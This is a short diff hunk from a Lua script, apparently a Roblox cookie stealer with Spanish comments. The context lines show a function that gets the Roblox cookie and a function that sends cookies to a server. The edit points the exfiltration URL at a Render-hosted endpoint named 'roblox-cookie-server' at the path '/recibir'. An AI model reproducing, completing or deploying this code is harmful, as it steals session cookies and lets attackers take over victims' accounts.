@@ -27,7 +27,7 @@ local function getRobloxCookie()
 end
 
 -- URL del servidor en Render
-local serverUrl = "https://server.onrender.com/recibir"
+local serverUrl = "https://roblox-cookie-server.onrender.com/recibir"
 
 -- Función para enviar las cookies al servidor
 local function sendCookieToServer(cookie)
